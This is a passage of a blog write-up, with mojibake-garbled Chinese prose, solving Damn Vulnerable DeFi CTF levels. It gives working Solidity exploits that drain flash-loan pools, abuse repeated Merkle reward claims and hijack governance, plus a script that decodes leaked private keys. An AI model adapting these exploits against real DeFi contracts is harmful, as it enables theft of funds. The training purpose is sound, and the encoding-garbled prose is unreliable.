class="line">    TrusterLenderPool public pool;</span><br><span class="line">    DamnValuableToken public token;</span><br><span class="line">    address recovery;</span><br><span class="line"></span><br><span class="line">    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        token = _token;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public returns (bool) &#123;</span><br><span class="line">        require(pool.flashLoan(</span><br><span class="line">            0,</span><br><span class="line">            address(this),</span><br><span class="line">            address(token),</span><br><span class="line">            abi.encodeCall(token.approve,(address(this), 1_000_000e18))</span><br><span class="line">        ));</span><br><span class="line">        token.transferFrom(address(pool), address(this), 1_000_000e18);</span><br><span class="line">        token.transfer(recovery, 1_000_000e18);</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TrusterChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_truster() public checkSolvedByPlayer &#123;</span><br><span class="line">        TrusterExploiter exploiter = new TrusterExploiter(pool, token, recovery);</span><br><span class="line">        require(exploiter.attack());</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="side-entrance">[4] Side Entrance</h1>
<p>è¿™é¢˜è·Ÿä¸Šä¸€é¢˜å¾ˆç›¸ä¼¼ï¼Œä½†æ˜¯ä¸Šä¸€é¢˜ç”¨çš„æ˜¯ä»£å¸ï¼Œè¿™ä¸€é¢˜å°±å®Œå®Œå…¨å…¨ç”¨çš„ ether
äº†ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥åœ¨
<code>IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</code>
é‡Œå°†è´·æ¬¾æ¥çš„é’±å†ç”¨ deposit å­˜å…¥ SideEntranceLenderPool
åˆçº¦ä¸­ï¼Œè¿™æ ·ä¸ä»…ä¸ä¼šå½±å“ RepayFailedï¼Œè¿˜å¯ä»¥è®©
balances[IFlashLoanEtherReceiver] = 1000ï¼Œä¹‹åæˆ‘ä»¬ withdraw
å³å¯æˆåŠŸææ¬¾ï¼Œç„¶åè½¬è´¦ç»™ recovery å°±å¥½äº†ã€‚exp å¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">contract IFlashLoanEtherReceiver &#123;</span><br><span class="line">    address player;</span><br><span class="line">    address recovery;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line"></span><br><span class="line">    constructor(SideEntranceLenderPool _pool, address _player, address _recovery) &#123;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        player = _player;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        pool.deposit&#123;value: msg.value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function callFlashLoan(uint256 amount) public &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">        pool.withdraw();</span><br><span class="line">        payable(recovery).transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SideEntranceChallenge is Test &#123;</span><br><span class="line">    ...</span><br><span class="line">    function test_sideEntrance() public checkSolvedByPlayer &#123;</span><br><span class="line">        IFlashLoanEtherReceiver receiver = new IFlashLoanEtherReceiver(pool, player, recovery);</span><br><span class="line">        receiver.callFlashLoan(1000e18);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="the-rewarder">[5] The Rewarder</h1>
<p>æ¼æ´åœ¨ claimRewards é‡Œï¼ŒåŒä¸€æ¬¡ claim å¤šä¸ªç›¸åŒçš„è´¦æˆ·ä¸ä¼šæœ‰é—®é¢˜...</p>
<p>å› ä¸ºç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œaddress(token) ==
address(0)ï¼Œä¸ä¼šè¿›å…¥_setClaimedï¼Œä¹‹åçš„è°ƒç”¨ token ==
inputTokens[inputClaim.tokenIndex]ï¼Œè¿›å…¥ else
åˆ†æ”¯ï¼Œä¹Ÿä¸ä¼šè¿›å…¥_setClaimedï¼Œç­‰åˆ°ä¸‹ä¸€ç§ä»£å¸çš„æ—¶å€™ï¼Œä½ å°±ç®—æŠŠæˆ‘ä¸Šä¸€ä¸ªä»£å¸
setClaimed ä¹Ÿæ²¡ç”¨äº†ã€‚</p>
<p>æ„Ÿè§‰è¿˜æ˜¯å®¡ä»£ç çš„è€å¿ƒä¸å¤Ÿ..ä¸æ¸…æ¥š merkel tree
çš„å·¥ä½œåŸç†ï¼Œæƒ³ä¸€ç¬”è°ƒç”¨å¹²å‡€ï¼Œä½†æ¯æ¬¡ claim çš„ amount ä¹Ÿè¦å®Œå…¨ç¬¦åˆ json
æ–‡ä»¶é‡Œçš„ amountï¼Œæ‰€ä»¥åªèƒ½å¤šç¬”ã€‚</p>
<p>é‚£æ—¢ç„¶æƒ³åˆ°å¤šç¬”è°ƒå‡ºæ¥ï¼Œå°±è‚¯å®šè¦ç ”ç©¶ claimRewards
å‡½æ•°ï¼Œç„¶åæ¨¡æ‹Ÿä¸€ä¸‹å°±èƒ½å‘ç°è¿™ä¸ª if åˆ¤æ–­æ¡ä»¶æœ‰é—®é¢˜ã€‚</p>
<p>æ²‰ä¸‹å¿ƒæ¥ï¼Œæ¬²é€Ÿåˆ™ä¸è¾¾ã€‚</p>
<p>expå¦‚ä¸‹</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">function test_theRewarder() public checkSolvedByPlayer &#123;</span><br><span class="line">        uint PLAYER_DVT_CLAIM_AMOUNT = 11524763827831882;</span><br><span class="line">        uint PLAYER_WETH_CLAIM_AMOUNT = 1171088749244340;</span><br><span class="line"></span><br><span class="line">        bytes32[] memory dvtLeaves = _loadRewards(&quot;/test/the-rewarder/dvt-distribution.json&quot;);</span><br><span class="line">        bytes32[] memory wethLeaves = _loadRewards(&quot;/test/the-rewarder/weth-distribution.json&quot;);</span><br><span class="line"></span><br><span class="line">        uint dvtTxCount = TOTAL_DVT_DISTRIBUTION_AMOUNT / PLAYER_DVT_CLAIM_AMOUNT;</span><br><span class="line">        uint wethTxCount = TOTAL_WETH_DISTRIBUTION_AMOUNT / PLAYER_WETH_CLAIM_AMOUNT;</span><br><span class="line">        uint totalTxCount = dvtTxCount + wethTxCount;</span><br><span class="line"></span><br><span class="line">        IERC20[] memory tokensToClaim = new IERC20[](2);</span><br><span class="line">        tokensToClaim[0] = IERC20(address(dvt));</span><br><span class="line">        tokensToClaim[1] = IERC20(address(weth));</span><br><span class="line"></span><br><span class="line">        // Create Alice&#x27;s claims</span><br><span class="line">        Claim[] memory claims = new Claim[](totalTxCount);</span><br><span class="line"></span><br><span class="line">        for (uint i = 0; i &lt; totalTxCount; i++) &#123;</span><br><span class="line">            if (i &lt; dvtTxCount) &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_DVT_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 0, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(dvtLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                claims[i] = Claim(&#123;</span><br><span class="line">                    batchNumber: 0, // claim corresponds to first DVT batch</span><br><span class="line">                    amount: PLAYER_WETH_CLAIM_AMOUNT,</span><br><span class="line">                    tokenIndex: 1, // claim corresponds to first token in `tokensToClaim` array</span><br><span class="line">                    proof: merkle.getProof(wethLeaves, 188) // Alice&#x27;s address is at index 2</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        distributor.claimRewards(&#123;</span><br><span class="line">            inputClaims: claims,</span><br><span class="line">            inputTokens: tokensToClaim</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        dvt.transfer(recovery, dvt.balanceOf(player));</span><br><span class="line">        weth.transfer(recovery, weth.balanceOf(player));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h1 id="selfie">[6] Selfie</h1>
<p>è¿™é“é¢˜å®ç°äº†ä¸ª fancy governance mechanismï¼Œå¦‚æœæˆ‘ä»¬é€šè¿‡
governance.executeAction è°ƒç”¨
emergencyExit(player)ï¼Œåº”è¯¥å°±å¯ä»¥æå–æ‰€æœ‰çš„é’±äº†ã€‚</p>
<p>ä¸»è¦é—®é¢˜æœ‰ä¸¤ä¸ªï¼Œç¬¬ä¸€ä¸ªæ˜¯ç»•è¿‡ queueAction é‡Œçš„
_hasEnoughVotesï¼Œè¿™ä¸ªå¯ä»¥é€šè¿‡åœ¨ onFlashLoan é‡Œè°ƒç”¨ queueAction
æ¥å®ç°</p>
<p>ç¬¬äºŒä¸ªé—®é¢˜æ˜¯è¦ç»•è¿‡ timestampï¼Œè®© timedelta å¤§äº 2
daysã€‚è¿™ä¸ªæˆ‘å®åœ¨æƒ³ä¸å‡ºæ¥äº†ï¼Œæˆ‘è§‰å¾—ç°å®ä¸­åº”è¯¥å°±æ˜¯éš”ä¸¤å¤©ä¹‹åå†è°ƒç”¨ï¼Œå°±èƒ½ç»•è¿‡äº†å§ã€‚</p>
<p>çœ‹å®Œåˆ«äººçš„wpï¼Œå±…ç„¶ç›´æ¥ç”¨vm.warp(block.timestamp + 2
days);ç»•è¿‡äº†...å¥½å§ï¼Œexpå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">import &#123;IERC3156FlashBorrower&#125; from &quot;openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Expoliter is IERC3156FlashBorrower &#123;</span><br><span class="line">    bytes32 private constant CALLBACK_SUCCESS = keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    address recovery;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    DamnValuableVotes token;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    constructor(DamnValuableVotes _token, SimpleGovernance _governance, SelfiePool _pool, address _recovery) &#123;</span><br><span class="line">        token = _token;</span><br><span class="line">        governance = _governance;</span><br><span class="line">        pool = _pool;</span><br><span class="line">        recovery = _recovery;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address receiver, address _token, uint256 _amount, uint256 nonce, bytes calldata _data) public returns (bytes32) &#123;</span><br><span class="line">        token.delegate(address(this));</span><br><span class="line">        token.approve(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeCall(pool.emergencyExit, (recovery)));</span><br><span class="line">        return CALLBACK_SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step1() public &#123;</span><br><span class="line">        pool.flashLoan(this, address(token), TOKENS_IN_POOL, &quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function step2() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function test_selfie() public checkSolvedByPlayer &#123;</span><br><span class="line">    Expoliter expoliter = new Expoliter(token, governance, pool, recovery);</span><br><span class="line">    expoliter.step1();</span><br><span class="line">    vm.warp(block.timestamp + 2 days);</span><br><span class="line">    expoliter.step2();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="compromised">[7] Compromised</h1>
<p>è¿™é¢˜æ˜¯çœŸæ‡µbäº†ï¼Œä¸çŸ¥é“é¢˜é¢ç»™çš„é‚£ä¸²æ•°å­—æœ‰ä»€ä¹ˆç”¨ï¼Œçœ‹äº†wpä¹‹åå¯ä»¥é€šè¿‡å®ƒæ¥è§£ç ç§é’¥ï¼Œè§£ç expå¦‚ä¸‹</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; ethers &#125; = <span class="built_in">require</span>(<span class="string">&quot;ethers&quot;</span>);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hexToAscii</span>(<span class="params">hex</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ascii = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; hex.<span class="property">length</span>; i += <span class="number">2</span>) &#123;</span><br><span class="line">        ascii += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="built_in">parseInt</span>(hex.<span class="title function_">substr</span>(i, <span class="number">2</span>), <span class="number">16</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ascii;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">decodeBase64</span>(<span class="params">base64Str</span>) &#123;</span><br><span class="line">    <span class="comment">// Decode Base64 to ASCII</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">atob</span>(base64Str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> leakedInformation = [</span><br><span class="line">    <span class="string">&#x27;4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34&#x27;</span>,</span><br><span class="line">]</span><br><span class="line">leakedInformation.<span class="title function_">forEach</span>(<span class="function"><span class="params">leak</span> =&gt;</span> &#123;</span><br><span class="line">    hexStr = leak.<span class="title function_">split</span>(<span class="string">` `</span>).<span class="title function_">join</span>(<span class="string">``</span>).<span class="title function_">toString</span>()</span><br><span class="line">    <span class="keyword">const</span> asciiStr = <span class="title function_">hexToAscii</span>(hexStr);</span><br><span class="line">    <span class="keyword">const</span> decodedStr = <span class="title function_">decodeBase64</span>(asciiStr);</span><br><span class="line">    <span class="keyword">const</span> privateKey = decodedStr;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Private Key:&quot;</span>, privateKey);</span><br><span class="line">    <span class="comment">// Create a wallet instance from the private key</span></span><br><span class="line">    <span class="keyword">const</span> wallet = <span class="keyword">new</span> ethers.<span class="title class_">Wallet</span>(privateKey);</span><br><span class="line">    <span class="comment">// Get the public key</span></span><br><span class="line">    <span class="keyword">const</span> address = wallet.<span class="property">address</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Public Key:&quot;</span>, address);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>å¾—åˆ°ä¸‹é¢çš„ç»“æœ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Private Key: 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9</span><br><span class="line">Public Key: 0xe92401A4d3af5E446d93D11EEc806b1462b39D15</span><br><span class="line">Private Key: 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48</span><br><span class="line">Public Key: 0x81A5D6E50C214044bE44cA0CB057fe119097850c</span><br></pre></td></tr></table></figure>
<p>å—ä¸äº†äº†...æˆ‘ä¹Ÿcompromiseäº†ï¼Œä¸æ‡‚æ€ä¹ˆåœ¨forgeé‡ŒéªŒè¯å…¬ç§é’¥ï¼Œå…ˆç•¥è¿‡å»äº†ğŸ‘‰ğŸ‘ˆ</p>
<h1 id="section">[8]</h1>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>æ–‡ç« ä½œè€…: </span><span class="post-copyright-info"><a href="http://heygap.github.io">HeyGap</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>æ–‡ç« é“¾æ¥: </span><span class="post-copyright-info"><a href="http://heygap.github.io/posts/26167.html">http://heygap.github.io/posts/26167.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>ç‰ˆæƒå£°æ˜: </span><span class="post-copyright-info">æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜æ¥æº <a href="http://heygap.github.io" target="_blank">HeyGap's_Blog</a>ï¼</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Blockchain/">Blockchain</a><a class="post-meta__tags" href="/tags/Smart-Contract/">Smart Contract</a></div><div class="post-share"><div class="social-share" data-image="/img/cover7.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/36493.html" title="blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°"><img class="cover" src="/img/cover8.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">ä¸Šä¸€ç¯‡</div><div class="info-item-2">blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°</div></div><div class="info-2"><div class="info-item-1"> æ¥åˆ°äº†é“¾ä¸Šçš„é¡¹ç›®ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹   0x00 ç¯å¢ƒæ­å»º æˆ‘ç”¨çš„æ˜¯è¿™ä¸ªé¶åœºï¼Œéœ€è¦ä¸‹è½½MetaMaskï¼Œä¸‹è½½å®Œæ¯•ä¹‹åå¯ä»¥åˆ‡æ¢åˆ°Sepoliaæµ‹è¯•å¸ï¼Œå»è¿™é‡Œå¼€æºæŒ–å¸ï¼Œå°±æœ‰æµ‹è¯•å¸å¯ä»¥æ­å»ºInstanceäº†(ä¸è¿‡éœ€è¦è®¤è¯scoreï¼Œä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦è®¤è¯å¥½githubå°±èƒ½è¿‡) 0x01 é¢˜ç›® 00 Hello Ethernaut è¿™ä¸ªé¢˜ç›®å®Œå…¨æ˜¯æ–°æ‰‹æ•™ç¨‹ï¼Œè®©æˆ‘ä»¬ä¸contractçš„infoè¿™ä¸ªmethodè¿›è¡Œäº¤äº’ï¼Œæˆ‘ä»¬æ‰“å¼€æ§åˆ¶å°æŒ‰ç…§ä»–çš„æ„æ€ä¸€ç›´contract.xxx("xxx")å°±è¡Œäº† 01 Fallback  æ¼æ´ç±»å‹ï¼šä¸ç®—æ¼æ´   take-away msg:fallback/receive å‡½æ•°è§¦å‘æ—¶æœº  Basic è¿™ä¸€å…³çš„åå­—æ˜¯Fallbackï¼Œfallbackæ˜¯ä¸€ç±»å‡½æ•°ï¼Œè¿™ç±»å‡½æ•°å¯ä»¥åœ¨åˆçº¦æ¥æ”¶åˆ°ä»¥å¤ªå¸æ—¶æ‰§è¡Œä¸€äº›æ“ä½œï¼ˆExplorationé‡Œæœ‰æ›´ç²¾ç¡®çš„å®šä¹‰ï¼‰ã€‚æœ¬é¢˜ä¸­ï¼Œå½“æ¥æ”¶çš„å¸å¤§äº0å¹¶ä¸”å¸çš„å‘é€æ–¹åœ¨å‘é€è¿™æ¡æ¶ˆæ¯ä¹‹å‰å·²ç»å¯¹è¯¥åˆçº¦æœ‰äº†è´¡çŒ®ï¼ˆå‘é€è¿‡å¸ï¼‰ï¼Œé‚£å°±æŠŠè¿™ä¸ªåˆçº¦çš„æ‰€æœ‰æƒç§»äº¤ç»™å¸çš„å‘é€æ–¹ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åªéœ€è¦ 12await...</div></div></div></a><a class="pagination-related" href="/posts/61276.html" title="CSBasics - NJU_Program_Analysis_Note"><img class="cover" src="/img/cover9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">ä¸‹ä¸€ç¯‡</div><div class="info-item-2">CSBasics - NJU_Program_Analysis_Note</div></div><div class="info-2"><div class="info-item-1"> è®°å½•ä¸€ä¸‹ä¸Šè¯¾+åšå®éªŒæ—¶äº§ç”Ÿçš„é—®é¢˜ã€æ€è€ƒä¸æ”¶è·   [1] Lecture1 Introduction [1-1] what is Static Analysisï¼Ÿ Static Analysis is different with dynamic analysis, analyzers need to construct static bird's view of the whole workflows. Besides, static analyzers usually focus on the consequence of the analysis rather than the process. [1-2] What is a good Static Analysis? Before introducing what is a good static analysis, we need to find out what is 'sound' and what is 'complete'. sound: We describe a result...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>ç›¸å…³æ¨è</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/13129.html" title="blockchain - Uniswap V2"><img class="cover" src="/img/cover2.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-04</div><div class="info-item-2">blockchain - Uniswap V2</div></div><div class="info-2"><div class="info-item-1"> å­¦ä¹ ä¸€ä¸‹ Uniswap V2   [1] å‰ç½®çŸ¥è¯† [1-1] AMM(Automated Market Makers) ä¸€ç§å»ä¸­å¿ƒåŒ–çš„äº¤æ˜“åè®®ï¼Œç”¨äºåœ¨åŒºå—é“¾ç½‘ç»œä¸­å®ç°æ— éœ€è®¢å•ç°¿çš„èµ„äº§äº¤æ¢ã€‚ä¼ ç»Ÿäº¤æ˜“æ‰€é€šå¸¸ä¾èµ–äºä¹°å®¶å’Œå–å®¶é€šè¿‡è®¢å•ç°¿æ¥åŒ¹é…äº¤æ˜“ï¼Œè€ŒAMMé€šè¿‡æ™ºèƒ½åˆçº¦å’Œç®—æ³•è‡ªåŠ¨ç¡®å®šèµ„äº§çš„ä»·æ ¼ï¼Œä»è€Œè¿›è¡Œäº¤æ˜“ã€‚ AMMçš„åŸºæœ¬åŸç†æ˜¯é€šè¿‡æ± å­ï¼ˆLiquidity Poolsï¼‰æ¥æä¾›æµåŠ¨æ€§ã€‚æµåŠ¨æ€§æ± é€šå¸¸ç”±ä¸¤ç§æˆ–æ›´å¤šç§èµ„äº§ç»„æˆï¼Œå¹¶ç”±æµåŠ¨æ€§æä¾›è€…ï¼ˆLPï¼‰å­˜å…¥è¿™äº›èµ„äº§ã€‚ç„¶åï¼ŒAMMä½¿ç”¨ç‰¹å®šçš„ç®—æ³•ï¼ˆä¾‹å¦‚å¸¸è§çš„x * y...</div></div></div></a><a class="pagination-related" href="/posts/36493.html" title="blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°"><img class="cover" src="/img/cover8.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-07-19</div><div class="info-item-2">blockchain - Ethernautæ™ºèƒ½åˆçº¦æ¼æ´é¶åœºå¤ç°</div></div><div class="info-2"><div class="info-item-1"> æ¥åˆ°äº†é“¾ä¸Šçš„é¡¹ç›®ï¼Œæ­£å¥½å­¦ä¹ ä¸€ä¸‹   0x00 ç¯å¢ƒæ­å»º æˆ‘ç”¨çš„æ˜¯è¿™ä¸ªé¶åœºï¼Œéœ€è¦ä¸‹è½½MetaMaskï¼Œä¸‹è½½å®Œæ¯•ä¹‹åå¯ä»¥åˆ‡æ¢åˆ°Sepoliaæµ‹è¯•å¸ï¼Œå»è¿™é‡Œå¼€æºæŒ–å¸ï¼Œå°±æœ‰æµ‹è¯•å¸å¯ä»¥æ­å»ºInstanceäº†(ä¸è¿‡éœ€è¦è®¤è¯scoreï¼Œä¹Ÿå¾ˆç®€å•ï¼Œåªéœ€è¦è®¤è¯å¥½githubå°±èƒ½è¿‡) 0x01 é¢˜ç›® 00 Hello Ethernaut è¿™ä¸ªé¢˜ç›®å®Œå…¨æ˜¯æ–°æ‰‹æ•™ç¨‹ï¼Œè®©æˆ‘ä»¬ä¸contractçš„infoè¿™ä¸ªmethodè¿›è¡Œäº¤äº’ï¼Œæˆ‘ä»¬æ‰“å¼€æ§åˆ¶å°æŒ‰ç…§ä»–çš„æ„æ€ä¸€ç›´contract.xxx("xxx")å°±è¡Œäº† 01 Fallback  æ¼æ´ç±»å‹ï¼šä¸ç®—æ¼æ´   take-away msg:fallback/receive å‡½æ•°è§¦å‘æ—¶æœº  Basic 